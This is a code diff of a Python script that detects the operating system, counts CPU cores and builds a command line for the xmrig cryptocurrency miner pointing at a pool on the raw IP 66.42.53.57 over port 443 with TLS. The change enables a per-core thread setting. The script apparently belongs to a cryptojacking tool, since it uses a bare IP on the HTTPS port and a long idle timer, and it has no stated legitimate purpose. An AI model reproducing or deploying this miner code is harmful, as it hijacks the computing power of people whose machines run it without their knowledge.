@@ -13,9 +13,10 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-#cores = multiprocessing.cpu_count()
-#if cores <= 0:
-#    cores = 1
+cores = multiprocessing.cpu_count()
+cores = cores - 1
+if cores <= 0:
+    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 if operate_system == 'lin':
@@ -33,8 +34,8 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-#command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
-command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
+command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
+#command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
 #while True:
 time.sleep(1)
 working_dir = os.path.dirname(os.path.realpath(__file__))
